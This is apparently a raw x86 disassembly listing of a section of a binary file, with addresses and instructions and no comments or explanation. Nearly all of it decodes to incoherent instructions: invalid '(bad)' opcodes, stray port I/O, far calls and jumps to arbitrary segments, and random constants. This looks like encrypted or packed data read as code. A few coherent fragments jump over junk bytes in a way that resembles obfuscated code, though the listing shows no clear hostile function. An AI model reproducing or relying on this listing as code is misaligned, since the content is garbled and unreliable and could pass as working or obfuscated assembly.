  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x6c1b405f
  406b85:	pop    es
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0xe87e7e7f
  406b8f:	cdq    
  406b90:	xchg   BYTE PTR [edx],ah
  406b92:	inc    esi
  406b93:	fwait
  406b94:	pusha  
  406b95:	xor    eax,0xcb72248c
  406b9a:	cmp    BYTE PTR [ebx-0x1a],ah
  406b9d:	xor    al,0xf9
  406b9f:	push   ds
  406ba0:	dec    ebx
  406ba1:	int3   
  406ba2:	daa    
  406ba3:	outs   dx,DWORD PTR ds:[esi]
  406ba4:	popf   
  406ba5:	adc    bl,BYTE PTR [esi-0x7156b8aa]
  406bab:	cmp    edi,DWORD PTR [ecx-0x2c]
  406bae:	pop    esi
  406baf:	(bad)  
  406bb0:	adc    edi,DWORD PTR [esi]
  406bb2:	mov    eax,0x6fdaac63
  406bb7:	mov    ds:0x26a55c40,eax
  406bbc:	jo     0x406b48
  406bbe:	fwait
  406bbf:	ret    
  406bc0:	mov    ds:0xcb2d94b2,al
  406bc5:	sti    
  406bc6:	push   0x4db1b61d
  406bcb:	outs   dx,DWORD PTR ds:[esi]
  406bcc:	xor    bl,BYTE PTR [ebp+0x2b0ae494]
  406bd2:	loop   0x406b85
  406bd4:	xchg   ebp,eax
  406bd5:	jge    0x406bd8
  406bd7:	cmp    cl,BYTE PTR [ebp-0x75]
  406bda:	enter  0x9204,0xb3
  406bde:	adc    al,0xdd
  406be0:	shr    BYTE PTR [edx],cl
  406be2:	aam    0x88
  406be4:	mov    DWORD PTR [ecx+ebx*4],0x1b069e80
  406beb:	and    DWORD PTR [edi],0x5030599
  406bf1:	iret   
  406bf2:	stos   BYTE PTR es:[edi],al
  406bf3:	test   DWORD PTR [edi],ebx
  406bf5:	inc    ebp
  406bf6:	mov    al,0x48
  406bf8:	mov    edx,0xfb526d3b
  406bfd:	cmp    bh,BYTE PTR [ebp-0x29]
  406c00:	icebp  
  406c01:	in     al,0xd8
  406c03:	sbb    edi,DWORD PTR [edi+0x5d]
  406c06:	shl    DWORD PTR [ebx],cl
  406c08:	inc    eax
  406c09:	sbb    dl,dh
  406c0b:	cwde   
  406c0c:	xor    dh,BYTE PTR [eax+0x380e3c62]
  406c12:	rol    BYTE PTR [ecx-0x42],1
  406c15:	loope  0x406bc0
  406c17:	(bad)  
  406c18:	shr    eax,cl
  406c1a:	mov    esp,DWORD PTR [edx-0x508338ff]
  406c20:	into   
  406c21:	pop    edi
  406c22:	frstor ds:0x77efa18b
  406c28:	mov    DWORD PTR [edx-0x72adf4e9],ebp
  406c2e:	cdq    
  406c2f:	xchg   ebx,eax
  406c30:	test   al,0x19
  406c32:	jae    0x406bc6
  406c34:	adc    BYTE PTR [edi],cl
  406c36:	sub    edx,edi
  406c38:	push   0x24
  406c3a:	je     0x406c02
  406c3c:	sbb    dl,0x20
  406c3f:	rcl    cl,0x52
  406c42:	lock sahf 
  406c44:	out    0x40,eax
  406c46:	dec    esi
  406c47:	jno    0x406bcd
  406c49:	int3   
  406c4a:	xchg   edi,eax
  406c4b:	dec    ebp
  406c4c:	jo     0x406c4e
  406c4e:	in     eax,dx
  406c4f:	leave  
  406c50:	cmp    dh,ch
  406c52:	lea    ebx,[ecx-0x18]
  406c55:	fs mov cl,0x56
  406c58:	mov    dl,0xa8
  406c5a:	in     al,dx
  406c5b:	sbb    ecx,DWORD PTR [esi-0x69]
  406c5e:	mov    DWORD PTR [ebx+edi*1+0xd203126],eax
  406c65:	cmp    eax,0xd723bdc8
  406c6a:	push   esi
  406c6b:	jbe    0x406c37
  406c6d:	jg     0x406c38
  406c6f:	mov    edi,0xccf1f978
  406c74:	es out 0xd3,eax
  406c77:	adc    eax,0x5ec4d12d
  406c7c:	outs   dx,BYTE PTR ds:[esi]
  406c7d:	and    eax,0x9812b22d
  406c82:	jmp    0xd083:0xfd6e6834
  406c89:	sar    edi,cl
  406c8b:	xor    al,0x62
  406c8d:	push   edi
  406c8e:	mov    ds:0x9cedc39,eax
  406c93:	mov    ebx,DWORD PTR ds:0xb720acd
  406c99:	xor    al,0x20
  406c9b:	xchg   esi,eax
  406c9c:	int3   
  406c9d:	out    0x38,eax
  406c9f:	(bad)  
  406ca0:	xor    ebx,DWORD PTR [ebx]
  406ca2:	scas   eax,DWORD PTR es:[edi]
  406ca3:	sbb    al,0xc6
  406ca5:	jle    0x406d18
  406ca7:	pop    ds
  406ca8:	cmp    BYTE PTR [ecx-0x2f788ecb],0xcb
  406caf:	xchg   edx,eax
  406cb0:	and    BYTE PTR [ecx],al
  406cb2:	sbb    ebx,DWORD PTR [edi+0x3a]
  406cb5:	and    eax,0x23859916
  406cba:	into   
  406cbb:	sub    BYTE PTR [edi],0x64
  406cbe:	ror    BYTE PTR [eax],1
  406cc0:	mov    ?,WORD PTR [ecx-0x73]
  406cc3:	jo     0x406cbe
  406cc5:	push   cs
  406cc6:	std    
  406cc7:	lock bound eax,QWORD PTR [ebp-0x31f7e0ea]
  406cce:	fcomp  QWORD PTR [eax-0x5b26a306]
  406cd4:	cld    
  406cd5:	push   es
  406cd6:	sub    BYTE PTR [esi+0x1],ch
  406cd9:	adc    cl,cl
  406cdb:	push   ds
  406cdc:	push   cs
  406cdd:	loope  0x406c73
  406cdf:	xchg   esi,eax
  406ce0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ce1:	scas   al,BYTE PTR es:[edi]
  406ce2:	push   edx
  406ce3:	cmp    DWORD PTR [edi],0xf9d5ddad
  406ce9:	arpl   WORD PTR [edx+0x9],bp
  406cec:	jbe    0x406c7d
  406cee:	xlat   BYTE PTR ds:[ebx]
  406cef:	imul   DWORD PTR [ecx+0x47d27aab]
  406cf5:	bound  ebp,QWORD PTR [ebp+0x1c]
  406cf8:	fadd   QWORD PTR [edx+0x2f]
  406cfb:	xchg   edi,eax
  406cfc:	dec    ebp
  406cfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cfe:	inc    edi
  406cff:	cdq    
  406d00:	cmp    DWORD PTR [edx+0x4a4841a3],edi
  406d06:	pop    edi
  406d07:	xchg   ebx,eax
  406d08:	and    al,0xb
  406d0a:	inc    ecx
  406d0b:	(bad)  
  406d0c:	cmp    DWORD PTR [ecx+ecx*4-0x2cf6c4ff],0xf1f19174
  406d17:	inc    esp
  406d18:	lods   eax,DWORD PTR ds:[esi]
  406d19:	rcr    BYTE PTR [ebx-0x7ee43cfa],0x5e
  406d20:	cmp    DWORD PTR [edi-0x41],0xffffffea
  406d24:	adc    al,0x21
  406d26:	gs cmp al,0x48
  406d29:	xchg   edx,eax
  406d2a:	retf   
  406d2b:	and    BYTE PTR [ebx-0x7f],dl
  406d2e:	jmp    0x406cbe
  406d30:	jmp    0xb63a:0x6dfd80af
  406d37:	lahf   
  406d38:	jecxz  0x406cbb
  406d3a:	not    DWORD PTR [edi+0x3e36b0d1]
  406d40:	mov    BYTE PTR [esi-0x3d],cl
  406d43:	int3   
  406d44:	data16 cli 
  406d46:	fsubr  QWORD PTR [esi-0xb]
  406d49:	and    al,0x92
  406d4b:	cmc    
  406d4c:	popf   
  406d4d:	in     al,dx
  406d4e:	shl    DWORD PTR [ecx],0x66
  406d51:	xor    eax,ecx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43372f,0x433613
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433723,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433663,0x43360f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x16
  406d91:	lods   eax,DWORD PTR ds:[esi]
  406d92:	shr    DWORD PTR [eax+0x40],cl
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0x7e7e7e7f
  406d9d:	pop    ebx
  406d9e:	ret    
  406d9f:	ss je  0x406d7a
  406da2:	sub    al,0x24
  406da4:	nop
  406da5:	int    0x34
  406da7:	test   al,0x20
  406da9:	or     BYTE PTR [edi],0xf0
  406dac:	mov    ebp,0x1f022a26
  406db1:	in     eax,dx
  406db2:	pop    ebp
  406db3:	ins    DWORD PTR es:[edi],dx
  406db4:	ins    BYTE PTR es:[edi],dx
  406db5:	mov    ds,esp
  406db7:	or     ebp,ecx
  406db9:	push   edi
  406dba:	pushf  
  406dbb:	(bad)  
  406dbc:	std    
  406dbd:	cmp    eax,0xc64d992f
  406dc2:	aaa    
  406dc3:	mov    dl,0x92
  406dc5:	xchg   ebp,esi
  406dc7:	retf   0x8c35
  406dca:	xlat   BYTE PTR ds:[ebx]
  406dcb:	xchg   DWORD PTR [edi],edi
  406dcd:	scas   al,BYTE PTR es:[edi]
  406dce:	loop   0x406d6a
  406dd0:	xchg   ebx,eax
  406dd1:	enter  0x3dff,0x1
  406dd5:	retf   0x8b1f
  406dd8:	jnp    0x406da4
  406dda:	sbb    dh,dh
  406ddc:	sbb    DWORD PTR [edi+0x16757d0e],0xd2d7f548
  406de6:	sbb    eax,0x6d097ced
  406deb:	(bad)  
  406dee:	jmp    0x6f12:0x215288bb
  406df5:	xor    BYTE PTR [esi-0x3dc0687b],ah
  406dfb:	cs fwait
  406dfd:	cdq    
  406dfe:	mov    ds:0x9cd06682,al
  406e03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e04:	xchg   BYTE PTR [ebp-0x62],cl
  406e07:	jns    0x406daa
  406e09:	adc    DWORD PTR [ecx+eiz*2-0x1f],edi
  406e0d:	push   es
  406e0e:	pop    ss
  406e0f:	dec    eax
  406e10:	(bad)  
  406e11:	int    0x8b
  406e13:	xlat   BYTE PTR ds:[ebx]
  406e14:	jne    0x406e2b
  406e16:	shr    DWORD PTR [ebp+0x24d85968],1
  406e1c:	out    dx,eax
  406e1d:	mov    esi,DWORD PTR [edi+0x50]
  406e20:	fld    TBYTE PTR [ebx]
  406e22:	test   al,0x7b
  406e24:	dec    esi
  406e25:	(bad)  
  406e26:	cmp    BYTE PTR [edi-0x54583ba2],ah
  406e2c:	test   DWORD PTR [esi+0x426afe00],ebp
  406e32:	leave  
  406e33:	sub    bl,BYTE PTR ds:0x66dfb581
  406e39:	dec    ecx
  406e3a:	stc    
  406e3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e3c:	imul   ebx,esi,0x93f9e47
  406e42:	iret   
  406e43:	mov    al,ds:0x97cb5153
  406e48:	je     0x406dd9
  406e4a:	dec    ecx
  406e4b:	sub    al,0xec
  406e4d:	repnz int3 
  406e4f:	rol    ebp,0x6c
  406e52:	call   0x909b:0x49370b99
  406e59:	inc    esi
  406e5a:	lock xchg esi,eax
  406e5c:	add    bh,BYTE PTR [ebx+0x6304824e]
  406e62:	call   0x188eab14
  406e67:	mov    al,ds:0xd21d005f
  406e6c:	enter  0x5cb7,0x99
  406e70:	or     dl,0x6b
  406e73:	aad    0xe6
  406e75:	mov    fs,WORD PTR [esi-0x77fa0065]
  406e7b:	push   edx
  406e7c:	scas   eax,DWORD PTR es:[edi]
  406e7d:	or     BYTE PTR ds:0x9e18c19c,al
  406e83:	in     al,0xb4
  406e85:	lods   al,BYTE PTR ds:[esi]
  406e86:	sub    DWORD PTR [eax-0x5],0xffffffe8
  406e8a:	xor    esi,esp
  406e8c:	in     eax,0x87
  406e8e:	cmc    
  406e8f:	add    bh,BYTE PTR [edx+0x6149b858]
  406e95:	jo     0x406e66
  406e97:	mov    esp,0x6c5329d7
  406e9c:	lods   al,BYTE PTR ds:[esi]
  406e9d:	jmp    0x406e42
  406e9f:	paddusw mm2,QWORD PTR [ebp+0x3b]
  406ea3:	adc    BYTE PTR [ebp+0x241420c4],dl
  406ea9:	or     al,0xf9
  406eab:	(bad)  
  406ead:	dec    ecx
  406eae:	xchg   esi,eax
  406eaf:	loope  0x406ef3
  406eb1:	pop    eax
  406eb2:	xor    al,0x85
  406eb4:	icebp  
  406eb5:	into   
  406eb6:	sub    edi,ebx
  406eb8:	inc    ebp
  406eb9:	pop    ebp
  406eba:	xor    ah,al
  406ebc:	clc    
  406ebd:	push   ebx
  406ebe:	icebp  
  406ebf:	(bad)  
  406ec0:	loopne 0x406f34
  406ec2:	data16 jle 0x406f3d
  406ec5:	push   ds
  406ec6:	dec    edi
  406ec7:	jnp    0x406f33
  406ec9:	adc    edi,DWORD PTR [edx]
  406ecb:	adc    dh,BYTE PTR [edx-0x1e]
  406ece:	nop
  406ecf:	into   
  406ed0:	div    eax
  406ed2:	outs   dx,DWORD PTR ds:[esi]
  406ed3:	fld    TBYTE PTR [edx+0xd]
  406ed6:	mov    WORD PTR [eax],fs
  406ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ed9:	cmp    bh,dh
  406edb:	imul   ebx,eax,0xffffffb9
  406ede:	ins    DWORD PTR es:[edi],dx
  406edf:	mov    WORD PTR [eax-0x32],ss
  406ee2:	dec    edx
  406ee3:	jbe    0x406e8b
  406ee5:	pop    ebp
  406ee6:	dec    esp
  406ee7:	inc    al
  406ee9:	mov    BYTE PTR [edx+eiz*8],al
  406eec:	push   ebp
  406eed:	stc    
  406eee:	or     eax,0xe804b9b8
  406ef3:	mov    edx,0x75a3832d
  406ef8:	jno    0x406eb0
  406efa:	inc    ecx
  406efb:	sti    
  406efc:	adc    DWORD PTR [ebx-0x49],ebx
  406eff:	aam    0x67
  406f01:	retf   
  406f02:	ud2    
  406f04:	int    0x35
  406f06:	bound  ebp,QWORD PTR [ebx-0x47]
  406f09:	jne    0x406eae
  406f0b:	repz hlt 
  406f0d:	add    DWORD PTR ds:0xb757552d,ecx
  406f13:	stc    
  406f14:	mov    BYTE PTR [ecx+0x37],al
  406f17:	clc    
  406f18:	(bad)  
  406f19:	les    ebp,FWORD PTR [esi-0x6d]
  406f1c:	les    edx,FWORD PTR [eax]
  406f1e:	pop    ebx
  406f1f:	push   ds
  406f20:	shl    DWORD PTR [eax],cl
  406f22:	mov    es,WORD PTR [edi-0x27]
  406f25:	test   eax,0x9c75cc22
  406f2a:	js     0x406f57
  406f2c:	loopne 0x406fa1
  406f2e:	(bad)  
  406f30:	adc    dh,BYTE PTR [ebx]
  406f32:	xor    BYTE PTR [esi+eiz*8-0x3fe8daf0],0x51
  406f3a:	adc    al,0xcd
  406f3c:	push   ds
  406f3d:	sub    DWORD PTR [ebx+ebp*8-0x73],ebx
  406f41:	ret    
  406f42:	jp     0x406f2a
  406f44:	call   0x477242d7
  406f49:	cdq    
  406f4a:	adc    DWORD PTR [ebp+0x3e93c52b],0xffffffa5
  406f51:	lods   eax,DWORD PTR ds:[esi]
  406f52:	scas   eax,DWORD PTR es:[edi]
  406f53:	push   es
  406f54:	shl    ebx,0x2b
  406f57:	add    eax,0x2b95bebe
  406f5c:	push   ebx
  406f5d:	xchg   esi,eax
  406f5e:	not    eax
  406f60:	and    DWORD PTR ds:0x43360f,0x433653
  406f6a:	and    eax,DWORD PTR [ecx]
  406f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  406f6f:	mov    DWORD PTR [ecx],eax
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0x15bf8e4a
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xa67e7e7f
  406f9f:	push   es
  406fa0:	ror    BYTE PTR ds:0xfc5a14eb,cl
  406fa6:	div    edi
  406fa8:	retf   
  406fa9:	cwde   
  406faa:	push   edi
  406fab:	cdq    
  406fac:	lea    edi,[ebp+0x42a88f29]
  406fb2:	push   eax
  406fb3:	and    DWORD PTR [eax],eax
  406fb5:	cld    
  406fb6:	out    dx,eax
  406fb7:	dec    edi
  406fb8:	mov    al,ds:0x8f05085e
  406fbd:	sub    dh,dl
  406fbf:	in     al,0x5a
  406fc1:	ja     0x406f9f
  406fc3:	enter  0xf868,0x7e
  406fc7:	call   0x48f5:0x6e8b923a
  406fce:	je     0x406fce
  406fd0:	stos   BYTE PTR es:[edi],al
  406fd1:	dec    ecx
  406fd2:	retf   
  406fd3:	jp     0x406fb9
  406fd5:	inc    eax
  406fd6:	jne    0x406f90
  406fd8:	sahf   
  406fd9:	mov    cl,0x6c
  406fdb:	test   eax,0xf4a1e8
  406fe0:	dec    edi
  406fe1:	adc    DWORD PTR [ebx-0xbf88db3],0x832cea7c
  406feb:	pushf  
  406fec:	sti    
  406fed:	cmp    DWORD PTR [ecx+0x66675e9b],edi
  406ff3:	pushf  
  406ff4:	mov    ecx,0x74aeb597
  406ff9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ffa:	daa    
  406ffb:	shr    DWORD PTR [edi-0x5fdd7e02],1
  407001:	data16 arpl WORD PTR [ebx+0xa],bp
  407005:	mov    dx,0xe9a4
  407009:	cs popf 
  40700b:	or     DWORD PTR [eax-0x18],ecx
  40700e:	call   0xbb5f:0xca65362e
  407015:	repz push ds
  407017:	ret    
  407018:	dec    eax
  407019:	scas   al,BYTE PTR es:[edi]
  40701a:	sahf   
  40701b:	or     eax,ebx
  40701d:	test   DWORD PTR [edx],esi
  40701f:	es jbe 0x407041
  407022:	jbe    0x406fed
  407024:	mov    ch,0xe4
  407026:	js     0x406fab
  407028:	inc    eax
  407029:	and    BYTE PTR [ebx],dh
  40702b:	(bad)  
  40702c:	fcmove st,st(6)
  40702e:	sbb    eax,0xffadaf1c
  407033:	mov    ecx,0x24b5f3c1
  407038:	int    0x42
  40703a:	call   0xbe037ce1
  40703f:	mov    DWORD PTR [ecx],esi
  407041:	retf   
  407042:	outs   dx,DWORD PTR ds:[esi]
  407043:	jg     0x40708d
  407045:	jmp    0xd3a89415
  40704a:	clc    
  40704b:	mov    edi,0x8fe5d691
  407050:	sub    al,0xfd
  407052:	push   edx
  407053:	mov    ebx,0xd5141ef7
  407058:	mov    ebx,0xfe2f2a30
  40705d:	pop    edi
  40705e:	mov    edi,0x58376a72
  407063:	in     al,0x29
  407065:	sub    ecx,ebp
  407067:	mov    ebx,DWORD PTR [esi+0x4]
  40706a:	stos   BYTE PTR es:[edi],al
  40706b:	push   edi
  40706c:	mov    ebx,0xe2a5483
  407071:	inc    ebx
  407072:	inc    edx
  407073:	std    
  407074:	dec    ecx
  407075:	lods   eax,DWORD PTR ds:[esi]
  407076:	dec    esi
  407077:	lods   al,BYTE PTR ds:[esi]
  407078:	ret    
  407079:	shl    BYTE PTR [ecx],1
  40707b:	(bad)  
  40707c:	in     al,dx
  40707d:	imul   eax,DWORD PTR [ebp-0x43ae2342],0x2b
  407084:	pop    eax
  407085:	jbe    0x407009
  407087:	inc    edx
  407088:	(bad)  
  40708a:	xchg   ecx,eax
  40708b:	inc    esp
  40708c:	jge    0x4070a0
  40708e:	or     esi,edx
  407090:	adc    ah,BYTE PTR [edi+0x24]
  407093:	loop   0x40705a
  407095:	jnp    0x40703c
  407097:	inc    ecx
  407098:	and    ah,BYTE PTR [eax-0x265f825d]
  40709e:	add    ebx,DWORD PTR [eax-0x33579f7f]
  4070a4:	push   ds
  4070a5:	mov    eax,DWORD PTR [eax+esi*8]
  4070a8:	push   ss
  4070a9:	loop   0x4070e9
  4070ab:	mov    ah,0x50
  4070ad:	pop    es
  4070ae:	cmp    eax,0x85e5952c
  4070b3:	jmp    0x33d7f3e4
  4070b8:	idiv   DWORD PTR [ebx+eax*2]
  4070bb:	mov    edi,edi
  4070bd:	scas   al,BYTE PTR es:[edi]
  4070be:	aas    
  4070bf:	xchg   ebp,eax
  4070c0:	test   al,0x14
  4070c2:	out    dx,eax
  4070c3:	mov    eax,0xc7db5a73
  4070c8:	aad    0xcb
  4070ca:	mov    bl,BYTE PTR [ebx-0x3c23dd8]
  4070d0:	loopne 0x4070af
  4070d2:	enter  0xffd9,0xb9
  4070d6:	adc    DWORD PTR [edx+ebx*1],edx
  4070d9:	mov    eax,ds:0x7b50263
  4070de:	call   0xbcbfff11
  4070e3:	loope  0x40713a
  4070e5:	xchg   ebp,eax
  4070e6:	or     BYTE PTR [ebx-0x3cb68812],ch
  4070ec:	add    DWORD PTR [edx-0x242a713d],ebx
  4070f2:	xchg   edi,eax
  4070f3:	adc    esp,esp
  4070f5:	sbb    sp,bp
  4070f8:	xlat   BYTE PTR ds:[ebx]
  4070f9:	or     al,0x27
  4070fb:	fsubr  QWORD PTR [edi-0xe]
  4070fe:	xchg   esp,eax
  4070ff:	fiadd  DWORD PTR [ecx+0x7d545420]
  407105:	stc    
  407106:	aaa    
  407107:	push   edi
  407108:	mov    edi,DWORD PTR [esi-0x5b]
  40710b:	or     ch,ch
  40710d:	xchg   edi,eax
  40710e:	retf   
  40710f:	daa    
  407110:	xchg   DWORD PTR [eax+ebp*2+0x27],edx
  407114:	mov    edi,0xe0fa8138
  407119:	or     DWORD PTR [edi-0xf],edx
  40711c:	loopne 0x407151
  40711e:	xor    al,0xd6
  407120:	adc    eax,ebp
  407122:	mov    bl,0x8f
  407124:	ficomp WORD PTR [esi-0x31d023eb]
  40712a:	xchg   edi,eax
  40712b:	enter  0xc62a,0xc5
  40712f:	imul   esi,DWORD PTR [edx+0x39],0x5
  407133:	in     al,dx
  407134:	xor    eax,0x37be80b1
  407139:	(bad)  
  40713a:	enter  0x657a,0x22
  40713e:	jbe    0x407185
  407140:	test   DWORD PTR [ecx+ecx*4],edi
  407143:	jmp    0x4071c1
  407145:	or     al,0x38
  407147:	ds js  0x4071c5
  40714a:	push   ecx
  40714b:	inc    edx
  40714c:	sbb    bh,BYTE PTR [ebx]
  40714e:	int    0x32
  407150:	in     eax,dx
  407151:	push   ds
  407152:	es std 
  407154:	cli    
  407155:	sbb    dh,BYTE PTR [edx]
  407157:	dec    esi
  407158:	ins    DWORD PTR es:[edi],dx
  407159:	cmp    DWORD PTR [eax],ecx
  40715b:	in     eax,dx
  40715c:	frstor [ebp+0x75fff9ad]
  407162:	or     al,ch
  407164:	jmp    0x407167
  407166:	add    BYTE PTR [eax],al
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	adc    BYTE PTR [esi-0x27],dh
  40717e:	sti    
  40717f:	int3   
  407180:	les    edi,FWORD PTR [esi+0x7e]
  407183:	mov    esp,0xf77e7e7f
  407188:	leave  
  407189:	ret    
  40718a:	mov    ebx,0xd0a42872
  40718f:	sti    
  407190:	int    0x63
  407192:	in     eax,0xa2
  407194:	fst    QWORD PTR [ebp+0x3a73eca1]
  40719a:	out    0xbc,eax
  40719c:	fimul  DWORD PTR [eax]
  40719e:	push   edi
  40719f:	pop    esp
  4071a0:	loop   0x40712c
  4071a2:	ins    BYTE PTR es:[edi],dx
  4071a3:	fiadd  DWORD PTR [esp+esi*4+0x72bd49bf]
  4071aa:	fistp  DWORD PTR [edi-0x5]
  4071ad:	mov    dl,0xe5
  4071af:	je     0x407135
  4071b1:	addr16 mov cl,0x7
  4071b4:	fist   DWORD PTR [esi+0x7fda59ac]
  4071ba:	xor    al,0xdd
  4071bc:	(bad)  
  4071bd:	fisubr DWORD PTR [ecx+0x3982688]
  4071c3:	sbb    eax,0x6c242f46
  4071c8:	fdiv   DWORD PTR [edx]
  4071ca:	dec    edx
  4071cb:	push   ebx
  4071cc:	leave  
  4071cd:	xor    ebp,DWORD PTR [esi+eiz*8-0x3c]
  4071d1:	out    0xdb,eax
  4071d3:	mov    al,ds:0xd398d41
  4071d8:	loope  0x4071bf
  4071da:	in     eax,dx
  4071db:	rol    BYTE PTR [eax],0xf6
  4071de:	adc    al,0x6d
  4071e1:	mov    ch,0xa0
  4071e3:	inc    ebp
  4071e4:	dec    eax
  4071e5:	or     DWORD PTR [eax-0xfa321e6],esi
  4071eb:	repnz cmp DWORD PTR [edx],ebx
  4071ee:	mov    BYTE PTR [ebx],dl
  4071f0:	xchg   edi,eax
  4071f1:	rcr    BYTE PTR [eax-0x56],cl
  4071f4:	xor    ebx,DWORD PTR [eax]
  4071f6:	push   esi
  4071f7:	lds    edi,FWORD PTR [edi+0x24]
  4071fa:	and    DWORD PTR [eax-0x618c77b3],esi
  407200:	pusha  
  407201:	push   ds
  407202:	mov    al,ds:0xb597c22c
  407207:	ja     0x40724b
  407209:	xor    al,ah
  40720b:	rol    BYTE PTR [ebx],cl
  40720d:	gs jae 0x40723c
  407210:	mov    ah,0x8f
  407212:	dec    esp
  407213:	xchg   esp,eax
  407214:	(bad)  
  407215:	push   edi
  407216:	leave  
  407217:	call   0x1349:0xbdbeaad8
  40721e:	jbe    0x40727e
  407220:	mov    al,0xda
  407222:	ins    DWORD PTR es:[edi],dx
  407223:	sbb    BYTE PTR [ecx-0x13],0x72
  407227:	(bad)  
  407228:	retf   0x4149
  40722b:	xchg   BYTE PTR [edi],bh
  40722d:	xor    dh,dh
  40722f:	and    eax,0xd8e57af
  407234:	out    dx,eax
  407235:	add    al,BYTE PTR [eax]
  407237:	push   ss
  407238:	or     al,0x53
  40723a:	jno    0x407218
  40723c:	sbb    BYTE PTR [esi+eiz*8+0x1853e0ee],bh
  407243:	movsx  ebp,WORD PTR [esi]
  407246:	int    0xbd
  407248:	fsubr  QWORD PTR [edi]
  40724a:	push   ecx
  40724b:	loope  0x407232
  40724d:	sub    eax,eax
  40724f:	sub    eax,0xfab7ec77
  407254:	fimul  WORD PTR [esi]
  407256:	sbb    al,0xb1
  407258:	push   ecx
  407259:	inc    ecx
  40725a:	sub    al,0xb9
  40725c:	dec    edx
  40725d:	call   FWORD PTR [edi+0x2316f6f]
  407263:	cmp    DWORD PTR [esp+ebp*4],esi
  407266:	lods   al,BYTE PTR ds:[esi]
  407267:	(bad)  
  407269:	adc    ebx,DWORD PTR [ecx]
  40726b:	mov    edi,DWORD PTR [esi-0x2d]
  40726e:	add    BYTE PTR [esi+0x1a],cl
  407271:	sub    DWORD PTR [esi+0x33],ebx
  407274:	fadd   QWORD PTR ds:0x73ffbe7a
  40727a:	inc    esp
  40727b:	dec    ecx
  40727c:	shl    DWORD PTR [ecx-0x1e907b9e],0x38
  407283:	xbegin 0x6ab89c8
  407289:	test   eax,esi
  40728b:	pop    eax
  40728c:	xor    eax,DWORD PTR [edi+0x4c]
  40728f:	xchg   ecx,eax
  407290:	xchg   BYTE PTR [edi-0x70],ch
  407293:	shl    BYTE PTR ds:0xd036b38d,1
  407299:	rol    eax,1
  40729b:	aad    0x8c
  40729d:	and    bh,BYTE PTR [ebp+0x69bd114a]
  4072a3:	repnz jecxz 0x4072c3
  4072a6:	cmp    eax,0x3b673fcf
  4072ab:	and    DWORD PTR [edx-0x3ea5ed8d],esp
  4072b1:	fsubr  QWORD PTR [esi]
  4072b3:	xor    al,0xc4
  4072b5:	shr    BYTE PTR [ebx+eax*1-0x62],cl
  4072b9:	push   ecx
  4072ba:	and    esp,ebx
  4072bc:	adc    al,0x4e
  4072be:	jecxz  0x4072da
  4072c0:	call   0x6096:0xd6418411
  4072c7:	(bad)  
  4072c8:	loopne 0x407338
  4072ca:	push   edx
  4072cb:	mov    eax,0xb34ec3d3
  4072d0:	repz pop ds
  4072d2:	iret   
  4072d3:	dec    esi
  4072d4:	add    BYTE PTR [esi+edi*1+0x29],ah
  4072d8:	cmp    edi,DWORD PTR [edx+0x7aa7438c]
  4072de:	or     eax,0xbd3220dd
  4072e3:	out    dx,eax
  4072e4:	out    dx,eax
  4072e5:	cwde   
  4072e6:	pushf  
  4072e7:	ins    BYTE PTR es:[edi],dx
  4072e8:	push   0x21
  4072ea:	xchg   ebx,eax
  4072eb:	in     al,dx
  4072ec:	int3   
  4072ed:	mov    esp,0x7dbabc5e
  4072f2:	sbb    eax,0x9990c136
  4072f7:	aad    0x6b
  4072f9:	adc    eax,0x95a503e1
  4072fe:	aad    0xa7
  407300:	retf   0xffd4
  407303:	sbb    eax,ebp
  407305:	pop    esi
  407306:	popa   
  407307:	lahf   
  407308:	call   0x1744:0x44593b0a
  40730f:	and    ch,ah
  407311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407312:	(bad)  
  407313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407314:	pop    es
  407315:	mov    ch,0xea
  407317:	lock jae 0x407398
  40731a:	lods   al,BYTE PTR ds:[esi]
  40731b:	dec    ebx
  40731c:	xor    bl,cl
  40731e:	jns    0x4072d9
  407320:	jo     0x4072b8
  407322:	push   ebp
  407323:	loop   0x407399
  407325:	adc    al,0x10
  407327:	aaa    
  407328:	jo     0x40735b
  40732a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40732b:	jp     0x407336
  40732d:	(bad)  
  40732e:	cmp    cl,BYTE PTR [ebp-0x36f05a45]
  407334:	xor    bh,0x2d
  407337:	loope  0x4072d2
  407339:	ret    0x703a
  40733c:	out    0x58,al
  40733e:	sbb    edi,DWORD PTR [eax+ebx*1-0xd]
  407342:	jmp    0xa78b3671
  407347:	rol    DWORD PTR [edi+0xf],0x84
  40734b:	daa    
